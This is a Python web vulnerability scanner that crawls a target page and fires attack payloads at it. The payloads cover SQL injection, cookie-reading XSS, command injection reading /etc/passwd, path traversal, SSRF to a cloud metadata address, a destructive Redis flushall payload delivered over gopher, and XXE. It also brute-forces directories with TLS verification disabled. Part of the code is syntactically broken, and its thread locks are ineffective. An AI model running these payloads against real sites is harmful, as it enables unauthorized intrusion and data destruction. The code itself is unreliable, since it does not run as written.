import time
import re
import requests
from bs4 import BeautifulSoup, Comment
import mechanicalsoup
from urllib.parse import urljoin
from typing import List, Dict, Optional
import threading
from queue import Queue
import concurrent.futures
import urllib3

class WebInspector:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.browser = mechanicalsoup.StatefulBrowser()
        self.site_html: Optional[BeautifulSoup] = None
        self.response: Optional[requests.Response] = None
        self.log_queue: List[str] = []
        
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Scanner": "SecurityAudit/1.0", 
            "Safe-Mode": "true"
        }

    def _log(self, message: str):
        """Internal logging function"""
        log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}"
        self.log_queue.append(log_entry)
        print(log_entry)

    def save_logs(self, filename: str = "./urlDrill/scan_log.txt"):
        """Save collected logs to file"""
        with open(filename, "a", encoding="utf-8") as f:
            f.write("\n".join(self.log_queue))
            f.write("\n" + "="*80 + "\n")
        self._log(f"Logs saved to {filename}")

    def analyze_scan_logs(self):
        """Parse scan logs and extract non-404 responses"""
        input_file = "scan_log.txt"
        output_file = "non404.txt"
        
        self._log(f"Analyzing scan logs for non-404 responses")
        
        try:
            with open(input_file, 'r') as infile, open(output_file, 'w') as outfile:
                pattern = re.compile(
                    r'TRY: (.+?) \| STATUS: (\d{3}) \| SIZE: (.+?) \| TIME: (.+?)s \| FINAL URL: (.+)'
                )
                
                found = 0
                for line in infile:
                    match = pattern.search(line)
                    if match:
                        status_code = int(match.group(2))
                        if status_code != 404:
                            outfile.write(line)
                            found += 1
                
                self._log(f"Found {found} non-404 responses in log file")
                self._log(f"Results saved to {output_file}")
                
        except FileNotFoundError:
            self._log("Error: Scan log file not found")
        except Exception as e:
            self._log(f"Log analysis failed: {str(e)}")

    def acquire_target(self):
        """Fetch and parse target website"""
        try:
            self._log(f"Acquiring target: {self.target_url}")
            self.response = self.session.get(
                self.target_url, 
                headers=self.headers,
                #urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Readd to disable insecure ssl warning
                verify=True, # DISABLE IF GETTING CERT ERROR
                timeout=10
            )
            self.response.raise_for_status()
            self.site_html = BeautifulSoup(self.response.content, "html.parser")
            self._log("Target acquired successfully")
    
        except Exception as e:
            self._log(f"Error acquiring target: {str(e)}")
            raise

    def find_links(self):
        """Discover all links on the page"""
        if not self.site_html:
            return
            
        self._log("Finding links...")
        for link in self.site_html.find_all('a'):
            href = link.get('href')
            if href:
                full_url = urljoin(self.target_url, href)
                self._log(f"Found URL: {full_url}")

    def find_forms(self):
        """Identify all forms and their properties"""
        if not self.site_html:
            return
            
        self._log("Finding forms...")
        for form in self.site_html.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            inputs = []
            
            for inp in form.find_all(['input', 'textarea', 'select']):
                inputs.append({
                    'name': inp.get('name'),
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value')
                })
                
            form_data = {
                'action': urljoin(self.target_url, action),
                'method': method,
                'inputs': inputs
            }
            self._log(f"Found form: {form_data}")

    def find_scripts(self):
        """Locate all external scripts"""
        if not self.site_html:
            return
            
        self._log("Finding scripts...")
        for script in self.site_html.find_all('script', src=True):
            src = script['src']
            full_url = urljoin(self.target_url, src)
            self._log(f"Found script: {full_url}")

    def check_vulnerabilities(self):
        """Comprehensive vulnerability checks covering OWASP Top 10"""
        self._log("Starting advanced vulnerability assessment...")
        
        test_endpoints = [
            "/.git/config",
            "/.env",
            "/admin",
            "/phpmyadmin",
            "/server-status",
            "/wp-login.php"
        ]
        
        sqli_payloads = [
            ("'", "SQL syntax"),
            ("1' OR 1=1--", "WHERE clause"),
            ("1 AND SLEEP(5)", "response delay"),
            ("1; SELECT PG_SLEEP(5)--", "postgres delay")
        ]
        
        # Test XSS in multiple contexts
        xss_payloads = {
            'reflected': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>"
            ],
            'stored': [
                "<svg onload=alert(document.cookie)>",
                "javascript:alert(document.domain)"
            ]
        }
        
        # Test command injection patterns
        cmd_payloads = [
            ";ls%20-la",
            "|cat%20/etc/passwd",
            "`id`",
            "$(ping%20-c%201%20127.0.0.1)"
        ]
        
        # test path traversal patterns
        traversal_payloads = [
            "../../../../etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%5c..%5cwindows%5cwin.ini"
        ]
        
        # test SSRF patterns
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0aset 1 0 3600 24%0d%0aMASTERHOST 127.0.0.1%0d%0aMASTERPORT 6379%0d%0a%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
        ]
        
        # test XXE payloads
        xxe_payload = '''<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>'''
        
        # test insecure deserialization
        deserialization_payloads = {
            'java': r"\xac\xed\x00\x05",  # Java serialized magic bytes
            'python': b"\x80\x04\x95\x23\x00\x00\x00\x00\x00\x00\x00"  # Pickle magic
        }
        
        self._log("\n[+] Checking sensitive endpoints")
        for endpoint in test_endpoints:
            try:
                resp = self.session.get(urljoin(self.target_url, endpoint), 
                if resp.status_code == 200:
                    self._log(f"Exposed sensitive endpoint: {endpoint}")
            except Exception as e:
                continue
        
        self._log("\n[+] Performing SQLi testing")
        for payload, indicator in sqli_payloads:
            try:
                test_url = f"{self.target_url}?id={payload}"
                start_time = time.time()
                resp = self.session.get(test_url, timeout=7)
                response_time = time.time() - start_time
                
                if (indicator in resp.text.lower()) or (response_time > 5):
                    self._log(f"Possible SQLi vulnerability with payload: {payload}")
            except Exception as e:
                continue
        
        self._log("\n[+] Performing XSS testing")
        forms = self.site_html.find_all('form') if self.site_html else []
        for form in forms:
            form_action = form.get('action', self.target_url)
            for payload_type, payloads in xss_payloads.items():
                for payload in payloads:
                    try:
                        inputs = {inp.get('name', 'input'): payload 
                                for inp in form.find_all('input')}
                        resp = self.session.post(
                            urljoin(self.target_url, form_action),
                            data=inputs
                        )
                        if payload in resp.text:
                            self._log(f"Possible {payload_type} XSS in form {form_action}")
                    except Exception as e:
                        continue
        
        self._log("\n[+] Testing command injection")
        for payload in cmd_payloads:
            try:
                test_url = f"{self.target_url}?cmd={payload}"
                resp = self.session.get(test_url)
                if "root:" in resp.text or "Microsoft Corp" in resp.text:
                    self._log(f"Possible command injection with payload: {payload}")
            except Exception as e:
                continue
        
        self._log("\n[+] Testing path traversal")
        for payload in traversal_payloads:
            try:
                test_url = f"{self.target_url}?file={payload}"
                resp = self.session.get(test_url)
                if "root:" in resp.text or "[extensions]" in resp.text:
                    self._log(f"Possible path traversal with payload: {payload}")
            except Exception as e:
                continue
        
        self._log("\n[+] Testing XXE vulnerabilities")
        try:
            resp = self.session.post(
                self.target_url,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'}
            )
            if "root:" in resp.text:
                self._log("Possible XXE vulnerability detected")
        except Exception as e:
            pass
        
        self._log("\n[+] Testing insecure deserialization")
        for lang, payload in deserialization_payloads.items():
            try:
                resp = self.session.post(
                    self.target_url,
                    data=payload,
                    headers={'Content-Type': 'application/octet-stream'}
                )
                if "java.io" in resp.text or "pickle" in resp.text:
                    self._log(f"Possible {lang} deserialization vulnerability")
            except Exception as e:
                continue
        
        self._log("Completed comprehensive vulnerability checks")

    def full_scan(self):
        """Perform comprehensive scan"""
        try:
            self.acquire_target()
            self.find_links()
            self.find_forms()
            self.find_scripts()
            self.check_vulnerabilities()   
            self.check_security_headers()
            self.find_hidden_elements()
            self.check_cors_policy()
            self._log("Full scan completed")
        except Exception as e:
            self._log(f"Scan failed: {str(e)}")

    def check_security_headers(self):
        """Analyze security headers"""
        if not self.response:
            return
            
        headers = self.response.headers
        security_headers = {
            'Content-Security-Policy': 'MISSING',
            'X-Frame-Options': 'MISSING',
            'X-Content-Type-Options': 'MISSING',
            'Strict-Transport-Security': 'MISSING'
        }

        for header in security_headers:
            if header in headers:
                security_headers[header] = headers[header]

        self._log(f"Security headers: {security_headers}")

    def find_hidden_elements(self):
        """Detect hidden HTML elements"""
        if not self.site_html:
            return
            
        hidden = self.site_html.select(
            '[type="hidden"], [style*="display:none"], [hidden]'
        )
        for element in hidden:
            self._log(f"Hidden element: {str(element)[:100]}")

    def check_cors_policy(self):

        """Check CORS configuration"""
        if not self.response:
            return
            
        cors_header = self.response.headers.get('Access-Control-Allow-Origin', 'NOT SET')
        self._log(f"CORS Policy: {cors_header}")

    def traverse_discovered_paths(self, path_file: str, thread_count: int = 20):
        """Threaded directory traversal with connection pooling"""
        self._log(f"Starting threaded traversal with {thread_count} workers")
        
        def worker(path_queue: Queue, session: requests.Session):
            while not path_queue.empty():
                try:
                    path = path_queue.get_nowait()
                    full_url = urljoin(self.target_url, path)
                    
                    start_time = time.time()
                    with session.get(
                        full_url,
                        headers=self.headers,
                        timeout=7,
                        allow_redirects=True,
                        stream=False
                    ) as response:
                        response_time = time.time() - start_time
                        
                        with threading.Lock():
                            self._log(
                                f"TRY: {path.ljust(20)} | "
                                f"STATUS: {response.status_code} | "
                                f"SIZE: {len(response.content):,} | "
                                f"TIME: {response_time:.2f}s | "
                                f"FINAL URL: {response.url}"
                            )
                            
                except Exception as e:
                    with threading.Lock():
                        self._log(f"FAIL: {path} - {str(e)}")
                finally:
                    path_queue.task_done()

        try:
            with open(path_file, 'r') as f:
                paths = [line.strip() for line in f if line.strip()]
                #THREAD QUE
                path_queue = Queue()
                for path in paths:
                    path_queue.put(path)
                    
                with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
                    futures = []
                    for _ in range(thread_count):
                        session = requests.Session()
                        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
                        session.verify = False
                        session.headers.update(self.headers)
                        
                        futures.append(
                            executor.submit(
                                worker,
                                path_queue,
                                session
                            )
                        )
                    
                    concurrent.futures.wait(futures)
                    
            self._log(f"Traversal completed with {len(paths)} paths checked")

        except Exception as e:
            self._log(f"Threaded traversal failed: {str(e)}")



if __name__ == "__main__":
    target = "https://www.scrapethissite.com/pages/simple/"
    inspector = WebInspector(target)

    with open("./urlDrill/logo.txt") as f:
        print(f.read())
    
    try:
        inspector.full_scan()
        print("NOTE - Some lines may be distorted due to threading.")
        time.sleep(1)
        inspector.traverse_discovered_paths("./urlDrill/traverse_list.txt")
        inspector.save_logs()
        inspector.analyze_scan_logs()
        print("HAVE A GOOD HUNT! o7")
    except KeyboardInterrupt:
        inspector._log("Scan interrupted by user")
        inspector.save_logs()
    except Exception as e:
        inspector._log(f"Critical error: {str(e)}")
        inspector.save_logs()
